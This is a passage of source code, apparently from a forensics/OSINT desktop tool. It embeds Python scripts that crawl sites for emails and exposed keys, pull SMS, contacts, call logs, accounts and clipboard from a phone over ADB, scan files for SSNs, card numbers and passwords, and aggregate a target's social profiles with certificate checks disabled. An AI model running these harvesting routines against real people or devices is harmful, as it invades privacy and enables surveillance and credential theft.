    forms = re.findall(r'<form([^>]*)>(.*?)</form>', body, re.DOTALL | re.IGNORECASE)
    for form_attrs, form_body in forms:
        action = re.search(r'action=["\\'](.*?)["\\'\\s]', form_attrs, re.IGNORECASE)
        method = re.search(r'method=["\\'](.*?)["\\'\\s]', form_attrs, re.IGNORECASE)
        inputs = re.findall(r'<input[^>]*(?:name|id)=["\\'](.*?)["\\'\\s]', form_body, re.IGNORECASE)
        input_types = re.findall(r'<input[^>]*type=["\\'](.*?)["\\'\\s]', form_body, re.IGNORECASE)
        form_info = json.dumps({
            'action': action.group(1) if action else '',
            'method': (method.group(1) if method else 'GET').upper(),
            'inputs': inputs[:15],
            'input_types': input_types[:15],
            'page': url,
        })
        results['forms'].add(form_info)

    # Cookies from headers
    cookies = headers.get('Set-Cookie', '')
    if cookies:
        results['cookies'].add(f'{url}: {cookies[:200]}')

    # Meta tags
    for meta in re.findall(r'<meta\\s+([^>]+)/?>', body, re.IGNORECASE):
        name_m = re.search(r'(?:name|property)=["\\'](.*?)["\\'\\s]', meta, re.IGNORECASE)
        content_m = re.search(r'content=["\\'](.*?)["\\'\\s]', meta, re.IGNORECASE)
        if name_m and content_m:
            key = name_m.group(1).lower()
            if any(k in key for k in ['author', 'generator', 'description', 'keyword',
                    'og:', 'twitter:', 'application-name']):
                results['metadata'].add(f'{name_m.group(1)}={content_m.group(1)[:100]}')

    # Page metadata for this URL
    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
    page_metadata[url] = {
        'title': title_m.group(1).strip()[:200] if title_m else '',
        'size': len(body),
        'emails': len(emails),
        'links': len(urls) + len(internal),
    }

def crawl(url, depth=0):
    if depth > max_depth or url in visited or len(visited) > 500:
        return
    visited.add(url)
    body, status, headers = fetch_page(url)
    if not body:
        return

    extract_from_page(url, body, headers)

    # Collect links to crawl
    to_crawl = []
    for href in re.findall(r'href=["\\'](https?://[^"\\'>]+)', body):
        parsed = urlparse(href)
        if parsed.hostname == base_domain and href not in visited:
            to_crawl.append(href)
    for p in re.findall(r'href=["\\'](/[^"\\'>]+)', body):
        full = urljoin(target, p)
        if full not in visited:
            to_crawl.append(full)

    # Crawl found links
    for link in to_crawl[:20]:
        crawl(link, depth + 1)

crawl(target)

# Also scan JS files for secrets/endpoints
js_to_scan = list(results['javascript'])[:20]
for js_url in js_to_scan:
    try:
        js_body, _, _ = fetch_page(js_url)
        if js_body:
            for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', js_body):
                results['api_endpoints'].add(urljoin(target, ep))
            for key in re.findall(r'["\\']((?:sk|pk|api|key|token|secret|access)[_-]?[a-zA-Z0-9]{16,})["\\'\\s]', js_body):
                results['potential_secrets'].add(key[:12] + '...')
    except: pass

# Convert sets to lists for JSON
output = {
    'target': target,
    'pages_crawled': len(visited),
    'emails': sorted(results['emails']),
    'phones': sorted(results['phones']),
    'urls': sorted(list(results['urls'])[:1000]),
    'internal_paths': sorted(list(results['internal'])[:1000]),
    'social_media': sorted(results['social']),
    'files': sorted(results['files']),
    'javascript_sources': sorted(list(results['javascript'])[:200]),
    'api_endpoints': sorted(results['api_endpoints']),
    'potential_secrets': sorted(results['potential_secrets']),
    'interesting_comments': sorted(results['comments']),
    'forms': [json.loads(f) for f in results['forms']],
    'cookies': sorted(results['cookies']),
    'metadata': sorted(results['metadata']),
    'page_details': page_metadata,
}

os.makedirs(output_dir, exist_ok=True)
for key in ['emails', 'phones', 'urls', 'internal_paths', 'social_media', 'files',
            'javascript_sources', 'api_endpoints', 'potential_secrets', 'interesting_comments']:
    filepath = os.path.join(output_dir, f'{key}.txt')
    with open(filepath, 'w') as f:
        f.write('\\n'.join(str(x) for x in output[key]))

with open(os.path.join(output_dir, 'crawl_results.json'), 'w') as f:
    json.dump(output, f, indent=2, default=str)

print(json.dumps({
    'pages_crawled': output['pages_crawled'],
    'emails_found': len(output['emails']),
    'phones_found': len(output['phones']),
    'urls_found': len(output['urls']),
    'files_found': len(output['files']),
    'social_found': len(output['social_media']),
    'api_endpoints': len(output['api_endpoints']),
    'secrets_found': len(output['potential_secrets']),
    'comments': len(output['interesting_comments']),
    'forms': len(output['forms']),
}))
`;
          const scriptPath = path.join(outputPath, '_crawler.py');
          await fs.writeFile(scriptPath, crawlerScript, 'utf-8');
          const fallback = await runCommand(python.path, [scriptPath, targetUrl, outputPath, String(crawlDepth)], { timeout: 300000 });
          await fs.unlink(scriptPath).catch(() => {});
          progress(progressCh, 100, 'Crawl complete');
          return { success: true, outputPath, summary: fallback.stdout.trim() };
        }

        progress(progressCh, 100, 'Photon crawl complete');
        return { success: true, outputPath, summary: result.stdout.trim() };
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// PII Polling Handler
// ---------------------------------------------------------------------------

function registerPiiPollingHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.PII_POLL,
    async (_event, options: {
      source: string;
      outputPath: string;
      targetIdentifier?: string;
      patterns: string[];
      deepScan?: boolean;
      crossReference?: boolean;
    }) => {
      const { source, outputPath, targetIdentifier, patterns, deepScan } = options;
      const progressCh = IPC_CHANNELS.PII_POLL_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting PII polling: ${source}`);

      const python = await resolveTool('python');

      try {
        switch (source) {
          case 'device-full':
          case 'device-targeted': {
            progress(progressCh, 10, 'Scanning device for PII...');
            if (!python.found) throw new Error('Python required for PII scanning');

            // First pull data from device if we have a serial (from targetIdentifier)
            const serial = targetIdentifier;
            const pullDir = path.join(outputPath, 'device_data');
            await ensureDir(pullDir);

            if (serial) {
              progress(progressCh, 15, 'Pulling contacts, SMS, and call logs from device...');
              const dataSources = [
                { label: 'SMS', cmd: 'content query --uri content://sms --projection address:body:date:type' },
                { label: 'Contacts', cmd: 'content query --uri content://contacts/phones --projection display_name:number' },
                { label: 'Call Log', cmd: 'content query --uri content://call_log/calls --projection number:type:date:duration' },
                { label: 'Accounts', cmd: 'dumpsys account' },
                { label: 'WiFi Networks', cmd: 'cmd wifi list-networks 2>/dev/null' },
                { label: 'Clipboard', cmd: 'service call clipboard 2 i32 1 i32 1 2>/dev/null' },
              ];
              if (source === 'device-full') {
                dataSources.push(
                  { label: 'Browser History', cmd: 'content query --uri content://browser/bookmarks --projection title:url 2>/dev/null' },
                  { label: 'Settings', cmd: 'settings list secure' },
                );
              }
              let pulledCount = 0;
              for (const ds of dataSources) {
                try {
                  const result = await adbService.shell(serial, ds.cmd);
                  if (result.trim()) {
                    await fs.writeFile(path.join(pullDir, `${ds.label.toLowerCase().replace(/\s+/g, '_')}.txt`), result);
                    pulledCount++;
                  }
                } catch { /* skip inaccessible */ }
              }
              progress(progressCh, 40, `Pulled ${pulledCount} data source(s). Scanning for PII patterns...`);
            } else {
              progress(progressCh, 40, 'No device serial provided. Scanning existing files in output folder...');
            }

            // Now scan pulled files for PII patterns
            const scanScript = `
import re, json, sys, os

scan_dir = sys.argv[1]
output_file = sys.argv[2]
patterns_str = sys.argv[3]
patterns = patterns_str.split(',')

REGEX_MAP = {
    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',
    'credit-card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\\b',
    'email': r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',
    'phone': r'\\b(?:\\+?1?[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b',
    'ip-address': r'\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b',
    'dob': r'\\b(?:0[1-9]|1[0-2])[/\\-](?:0[1-9]|[12]\\d|3[01])[/\\-](?:19|20)\\d{2}\\b',
    'bank-account': r'\\b\\d{8,17}\\b',
    'passport': r'\\b[A-Z]{1,2}\\d{6,9}\\b',
    'drivers-license': r'\\b[A-Z]{1,2}\\d{5,8}\\b',
    'username': r'(?:username|user|login|account)[\\s:=]+["\\'\\s]*([A-Za-z0-9._@-]{3,30})',
    'password': r'(?:password|passwd|pass|pwd|secret)[\\s:=]+["\\'\\s]*([^\\s"\\',;]{4,50})',
    'medical': r'(?:MRN|medical.record|patient.id|diagnosis|ICD[-]?\\d{1,2})[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'biometric': r'(?:fingerprint|face.id|iris|retina|biometric|facial.recognition)[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'address': r'\\b\\d{1,5}\\s+[A-Z][a-z]+\\s+(?:St|Ave|Blvd|Dr|Rd|Ln|Way|Ct|Pl|Cir|Pkwy|Terr?)\\b',
}

findings = []
files_scanned = 0
all_matches_by_type = {}

for root, dirs, files in os.walk(scan_dir):
    for fname in files:
        fpath = os.path.join(root, fname)
        try:
            with open(fpath, 'r', errors='ignore') as f:
                content = f.read(2000000)
            files_scanned += 1
            for ptype in patterns:
                if ptype in REGEX_MAP:
                    matches = re.findall(REGEX_MAP[ptype], content)
                    if matches:
                        findings.append({
                            'file': os.path.relpath(fpath, scan_dir),
                            'type': ptype,
                            'count': len(matches),
                            'samples': matches[:10]
                        })
                        if ptype not in all_matches_by_type:
                            all_matches_by_type[ptype] = set()
                        all_matches_by_type[ptype].update(matches[:50])
        except:
            pass

# Cross-reference: find items that appear in multiple files
cross_refs = []
for ptype, values in all_matches_by_type.items():
    for val in list(values)[:20]:
        occurrences = [f for f in findings if f['type'] == ptype and val in f.get('samples', [])]
        if len(occurrences) > 1:
            cross_refs.append({
                'type': ptype,
                'value': val[:30] + '...' if len(val) > 30 else val,
                'found_in_files': len(occurrences),
                'files': [o['file'] for o in occurrences[:5]]
            })

result = {
    'scan_dir': scan_dir,
    'files_scanned': files_scanned,
    'findings': findings,
    'total_pii_items': sum(f['count'] for f in findings),
    'patterns_checked': patterns,
    'summary_by_type': {t: sum(f['count'] for f in findings if f['type'] == t) for t in set(f['type'] for f in findings)},
    'cross_references': cross_refs
}
json.dump(result, open(output_file, 'w'), indent=2)
print(json.dumps({'files_scanned': files_scanned, 'pii_findings': len(findings), 'total_items': result['total_pii_items'], 'cross_refs': len(cross_refs)}))
`;
            const scriptPath = path.join(outputPath, '_pii_scan.py');
            const resultPath = path.join(outputPath, 'pii_scan_results.json');
            await fs.writeFile(scriptPath, scanScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, pullDir, resultPath, patterns.join(',')], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'PII scan complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'web-osint': {
            if (!targetIdentifier) throw new Error('Target identifier required for OSINT lookup');
            progress(progressCh, 10, `Running OSINT lookup for: ${targetIdentifier}...`);
            if (!python.found) throw new Error('Python required');

            const osintScript = `
import urllib.request, json, sys, ssl, re
from urllib.parse import quote

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {'target': target, 'sources': []}

# GitHub user search (no auth needed)
try:
    url = f'https://api.github.com/search/users?q={quote(target)}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    profiles = []
    for item in data.get('items', [])[:10]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG-Forensics/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            detail = json.loads(detail_resp.read())
            profiles.append({
                'username': detail.get('login', ''),
                'name': detail.get('name', ''),
                'email': detail.get('email', ''),
                'company': detail.get('company', ''),
                'location': detail.get('location', ''),
                'bio': detail.get('bio', ''),
                'profile_url': detail.get('html_url', ''),
                'repos': detail.get('public_repos', 0),
            })
        except: pass
    results['sources'].append({'name': 'GitHub', 'found': bool(profiles), 'profiles': profiles})
except Exception as e:
    results['sources'].append({'name': 'GitHub', 'found': False, 'error': str(e)})

# Reddit public search (no auth needed)
try:
    url = f'https://www.reddit.com/search.json?q={quote(target)}&limit=10'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    hits = []
    for child in data.get('data', {}).get('children', []):
        post = child.get('data', {})
        hits.append({
            'title': post.get('title', ''),
            'subreddit': post.get('subreddit', ''),
            'author': post.get('author', ''),
            'url': f'https://reddit.com{post.get("permalink", "")}',
        })
    results['sources'].append({'name': 'Reddit', 'found': bool(hits), 'posts': hits})
except Exception as e:
    results['sources'].append({'name': 'Reddit', 'found': False, 'error': str(e)})

# GitLab public search (no auth needed)
try:
    url = f'https://gitlab.com/api/v4/users?search={quote(target)}&per_page=5'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    gl_profiles = [{'username': u.get('username',''), 'name': u.get('name',''), 'profile_url': u.get('web_url','')} for u in data[:5]]
    results['sources'].append({'name': 'GitLab', 'found': bool(gl_profiles), 'profiles': gl_profiles})
except Exception as e:
    results['sources'].append({'name': 'GitLab', 'found': False, 'error': str(e)})

# Wikipedia search (no auth needed)
try:
    url = f'https://en.wikipedia.org/w/api.php?action=opensearch&search={quote(target)}&limit=5&format=json'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    if len(data) >= 4 and data[1]:
        results['sources'].append({'name': 'Wikipedia', 'found': True, 'titles': data[1], 'urls': data[3]})
    else:
        results['sources'].append({'name': 'Wikipedia', 'found': False})
except Exception as e:
    results['sources'].append({'name': 'Wikipedia', 'found': False, 'error': str(e)})

# Keybase public lookup (no auth needed)
try:
    url = f'https://keybase.io/_/api/1.0/user/lookup.json?usernames={quote(target)}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    if data.get('them') and data['them'][0]:
        kb = data['them'][0]
        kb_profile = {
            'username': kb.get('basics', {}).get('username', ''),
            'full_name': kb.get('profile', {}).get('full_name', ''),
            'location': kb.get('profile', {}).get('location', ''),
            'bio': kb.get('profile', {}).get('bio', ''),
        }
        results['sources'].append({'name': 'Keybase', 'found': True, 'profile': kb_profile})
    else:
        results['sources'].append({'name': 'Keybase', 'found': False})
except Exception as e:
    results['sources'].append({'name': 'Keybase', 'found': False, 'error': str(e)})

# Extract any emails found across all sources
all_text = json.dumps(results)
emails_found = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', all_text)))
results['extracted_emails'] = emails_found

json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'sources_checked': len(results['sources']), 'found': len([s for s in results['sources'] if s.get('found')]), 'emails_extracted': len(emails_found)}))
`;
            const scriptPath = path.join(outputPath, '_osint.py');
            const resultPath = path.join(outputPath, 'osint_results.json');
            await fs.writeFile(scriptPath, osintScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'OSINT lookup complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'document-scan': {
            progress(progressCh, 10, 'Scanning documents for PII patterns...');
            if (!python.found) throw new Error('Python required');
            // Scan any files in the output path for PII
            const scanScript = `
import re, json, sys, os

scan_dir = sys.argv[1]
output_file = sys.argv[2]
patterns_str = sys.argv[3]

REGEX_MAP = {
    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',
    'credit-card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\\b',
    'email': r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',
    'phone': r'\\b(?:\\+?1?[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b',
    'ip-address': r'\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b',
    'dob': r'\\b(?:0[1-9]|1[0-2])[/\\-](?:0[1-9]|[12]\\d|3[01])[/\\-](?:19|20)\\d{2}\\b',
    'bank-account': r'\\b\\d{8,17}\\b',
    'passport': r'\\b[A-Z]{1,2}\\d{6,9}\\b',
    'drivers-license': r'\\b[A-Z]{1,2}\\d{5,8}\\b',
    'username': r'(?:username|user|login|account)[\\s:=]+["\\'\\s]*([A-Za-z0-9._@-]{3,30})',
    'password': r'(?:password|passwd|pass|pwd|secret)[\\s:=]+["\\'\\s]*([^\\s"\\',;]{4,50})',
    'medical': r'(?:MRN|medical.record|patient.id|diagnosis|ICD[-]?\\d{1,2})[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'biometric': r'(?:fingerprint|face.id|iris|retina|biometric|facial.recognition)[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'address': r'\\b\\d{1,5}\\s+[A-Z][a-z]+\\s+(?:St|Ave|Blvd|Dr|Rd|Ln|Way|Ct|Pl|Cir|Pkwy|Terr?)\\b',
}

findings = []
for root, dirs, files in os.walk(scan_dir):
    for fname in files:
        fpath = os.path.join(root, fname)
        try:
            with open(fpath, 'r', errors='ignore') as f:
                content = f.read(1000000)  # 1MB limit per file
            for ptype, regex in REGEX_MAP.items():
                if ptype in patterns_str.split(','):
                    matches = re.findall(regex, content)
                    if matches:
                        findings.append({'file': fpath, 'type': ptype, 'count': len(matches), 'samples': matches[:5]})
        except:
            pass

json.dump({'scan_dir': scan_dir, 'findings': findings, 'total_pii_found': len(findings)}, open(output_file, 'w'), indent=2)
print(json.dumps({'files_scanned': sum(1 for _ in os.walk(scan_dir)), 'pii_findings': len(findings)}))
`;
            const scriptPath = path.join(outputPath, '_doc_scan.py');
            const resultPath = path.join(outputPath, 'document_pii_results.json');
            await fs.writeFile(scriptPath, scanScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, outputPath, resultPath, patterns.join(',')], { timeout: 120000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Document PII scan complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'email-enum': {
            if (!targetIdentifier) throw new Error('Target identifier required for email enumeration');
            if (!python.found) throw new Error('Python required');
            progress(progressCh, 10, `Enumerating emails for: ${targetIdentifier}...`);

            const emailEnumScript = `
import socket, json, sys, ssl, re
import urllib.request
from urllib.parse import quote

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {'target': target, 'emails_found': [], 'mx_records': [], 'dns_info': {}}

# Determine if target is a domain or a name/username
is_domain = '.' in target and ' ' not in target and '@' not in target
is_email = '@' in target
domain = target if is_domain else (target.split('@')[1] if is_email else None)

if domain:
    # DNS MX record lookup
    try:
        mx_answers = socket.getaddrinfo(domain, 25, socket.AF_INET, socket.SOCK_STREAM)
        results['dns_info']['has_mail_server'] = len(mx_answers) > 0
        results['dns_info']['mail_ips'] = list(set([a[4][0] for a in mx_answers]))
    except Exception as e:
        results['dns_info']['mx_error'] = str(e)

    # IP resolution
    try:
        ips = socket.getaddrinfo(domain, None)
        results['dns_info']['ips'] = list(set([ip[4][0] for ip in ips]))
    except Exception as e:
        results['dns_info']['ip_error'] = str(e)

    # Generate common email patterns
    common_prefixes = ['info', 'admin', 'contact', 'support', 'hello', 'office',
                       'sales', 'help', 'mail', 'webmaster', 'postmaster',
                       'abuse', 'security', 'noreply', 'no-reply', 'hr', 'jobs']
    results['common_patterns'] = [f'{p}@{domain}' for p in common_prefixes]

    # Check website for emails
    for proto in ['https', 'http']:
        try:
            url = f'{proto}://{domain}'
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)
            body = resp.read().decode('utf-8', errors='ignore')
            emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', body)))
            results['emails_found'].extend(emails)
            # Check contact/about pages
            for contact_path in ['/contact', '/about', '/team', '/contact-us', '/about-us']:
                try:
                    creq = urllib.request.Request(f'{url}{contact_path}', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                    cresp = urllib.request.urlopen(creq, timeout=5, context=ctx)
                    cbody = cresp.read().decode('utf-8', errors='ignore')
                    page_emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', cbody)
                    results['emails_found'].extend(page_emails)
                except: pass
            break
        except: pass
    results['emails_found'] = list(set(results['emails_found']))

# Search GitHub for the target
try:
    search_q = quote(target)
    url = f'https://api.github.com/search/users?q={search_q}&per_page=5'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG-Forensics/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            detail = json.loads(detail_resp.read())
            if detail.get('email'):
                results['emails_found'].append(detail['email'])
        except: pass
    results['emails_found'] = list(set(results['emails_found']))
except: pass

json.dump(results, open(output, 'w'), indent=2, default=str)
print(json.dumps({'emails_found': len(results['emails_found']), 'common_patterns': len(results.get('common_patterns', [])), 'has_mx': results['dns_info'].get('has_mail_server', False)}))
`;
            const scriptPath = path.join(outputPath, '_email_enum.py');
            const resultPath = path.join(outputPath, 'email_enum_results.json');
            await fs.writeFile(scriptPath, emailEnumScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Email enumeration complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'social-profile': {
            if (!targetIdentifier) throw new Error('Target identifier required for social profiling');
            if (!python.found) throw new Error('Python required');
            progress(progressCh, 10, `Aggregating social profiles for: ${targetIdentifier}...`);

            const socialScript = `
import urllib.request, json, sys, ssl
from urllib.parse import quote

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {'target': target, 'profiles': []}

# GitHub
try:
    url = f'https://api.github.com/search/users?q={quote(target)}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG-Forensics/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            d = json.loads(detail_resp.read())
            results['profiles'].append({
                'platform': 'GitHub',
                'username': d.get('login', ''),
                'display_name': d.get('name', ''),
                'bio': d.get('bio', ''),
                'location': d.get('location', ''),
                'email': d.get('email', ''),
                'company': d.get('company', ''),
                'url': d.get('html_url', ''),
                'followers': d.get('followers', 0),
                'repos': d.get('public_repos', 0),
                'created': d.get('created_at', ''),
            })
        except: pass
except: pass

# GitLab
try:
    url = f'https://gitlab.com/api/v4/users?search={quote(target)}&per_page=5'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for u in data[:5]:
        results['profiles'].append({
            'platform': 'GitLab',
            'username': u.get('username', ''),
            'display_name': u.get('name', ''),
            'bio': u.get('bio', ''),
            'location': u.get('location', ''),
            'url': u.get('web_url', ''),
            'created': u.get('created_at', ''),
        })
except: pass

# Reddit user check (public, no auth)
try:
    url = f'https://www.reddit.com/user/{quote(target)}/about.json'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    rd = data.get('data', {})
    if rd.get('name'):
        results['profiles'].append({
            'platform': 'Reddit',
            'username': rd.get('name', ''),
            'url': f'https://reddit.com/u/{rd.get("name", "")}',
            'karma': rd.get('total_karma', 0),
            'created': rd.get('created_utc', ''),
            'has_verified_email': rd.get('has_verified_email', False),
        })
except: pass

# Keybase
try:
    url = f'https://keybase.io/_/api/1.0/user/lookup.json?usernames={quote(target)}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    if data.get('them') and data['them'][0]:
        kb = data['them'][0]
        results['profiles'].append({
            'platform': 'Keybase',
            'username': kb.get('basics', {}).get('username', ''),
            'display_name': kb.get('profile', {}).get('full_name', ''),
            'bio': kb.get('profile', {}).get('bio', ''),
            'location': kb.get('profile', {}).get('location', ''),
            'url': f'https://keybase.io/{kb.get("basics", {}).get("username", "")}',
        })
except: pass

# Reddit search for mentions
try:
    url = f'https://www.reddit.com/search.json?q={quote(target)}&limit=5&sort=relevance'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    mentions = []
    for child in data.get('data', {}).get('children', []):
        post = child.get('data', {})
        mentions.append({'title': post.get('title',''), 'subreddit': post.get('subreddit',''), 'url': f'https://reddit.com{post.get("permalink","")}'})
    results['mentions'] = mentions
except: pass

json.dump(results, open(output, 'w'), indent=2, default=str)
print(json.dumps({'profiles_found': len(results['profiles']), 'platforms': list(set(p['platform'] for p in results['profiles'])), 'mentions': len(results.get('mentions', []))}))
`;
            const scriptPath = path.join(outputPath, '_social_profile.py');
            const resultPath = path.join(outputPath, 'social_profile_results.json');
            await fs.writeFile(scriptPath, socialScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 90000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Social profile aggregation complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'phone-lookup': {
            if (!targetIdentifier) throw new Error('Target identifier required for phone lookup');
            if (!python.found) throw new Error('Python required');
            progress(progressCh, 10, `Analyzing phone number: ${targetIdentifier}...`);

            const phoneScript = `
import re, json, sys

target = sys.argv[1]
output = sys.argv[2]

# Clean the number
digits = re.sub(r'[^0-9+]', '', target)
results = {'target': target, 'cleaned': digits, 'analysis': {}}

# Basic US/International number parsing
if digits.startswith('+'):
    # International format
    if digits.startswith('+1') and len(digits) == 12:
        results['analysis']['country'] = 'United States / Canada'
        results['analysis']['country_code'] = '+1'
        local = digits[2:]
        results['analysis']['area_code'] = local[:3]
        results['analysis']['local_number'] = f'{local[3:6]}-{local[6:]}'
        results['analysis']['format'] = 'NANP (North American)'
    elif digits.startswith('+44'):
        results['analysis']['country'] = 'United Kingdom'
        results['analysis']['country_code'] = '+44'
        results['analysis']['format'] = 'UK format'
    elif digits.startswith('+61'):
        results['analysis']['country'] = 'Australia'
        results['analysis']['country_code'] = '+61'
        results['analysis']['format'] = 'AU format'
    elif digits.startswith('+91'):
        results['analysis']['country'] = 'India'
        results['analysis']['country_code'] = '+91'
        results['analysis']['format'] = 'IN format'
    elif digits.startswith('+86'):
        results['analysis']['country'] = 'China'
        results['analysis']['country_code'] = '+86'
    elif digits.startswith('+49'):
        results['analysis']['country'] = 'Germany'
        results['analysis']['country_code'] = '+49'
    elif digits.startswith('+33'):
        results['analysis']['country'] = 'France'
        results['analysis']['country_code'] = '+33'
    elif digits.startswith('+81'):
        results['analysis']['country'] = 'Japan'
        results['analysis']['country_code'] = '+81'
    elif digits.startswith('+55'):
        results['analysis']['country'] = 'Brazil'
        results['analysis']['country_code'] = '+55'
    elif digits.startswith('+52'):
        results['analysis']['country'] = 'Mexico'
        results['analysis']['country_code'] = '+52'
    else:
        results['analysis']['country'] = 'Unknown (international)'
        results['analysis']['country_code'] = digits[:3]
elif len(digits) == 10:
    results['analysis']['country'] = 'United States / Canada (assumed)'
    results['analysis']['country_code'] = '+1'
    results['analysis']['area_code'] = digits[:3]
    results['analysis']['local_number'] = f'{digits[3:6]}-{digits[6:]}'
    results['analysis']['format'] = 'NANP (North American)'
elif len(digits) == 11 and digits.startswith('1'):
    results['analysis']['country'] = 'United States / Canada'
    results['analysis']['country_code'] = '+1'
    results['analysis']['area_code'] = digits[1:4]
    results['analysis']['local_number'] = f'{digits[4:7]}-{digits[7:]}'
    results['analysis']['format'] = 'NANP (North American)'
else:
    results['analysis']['format'] = 'Unknown format'
    results['analysis']['digit_count'] = len(digits)

# US area code database (partial, common codes)
US_AREA_CODES = {
    '201': 'New Jersey', '202': 'Washington DC', '203': 'Connecticut', '206': 'Washington',
    '207': 'Maine', '208': 'Idaho', '209': 'California', '210': 'Texas', '212': 'New York',
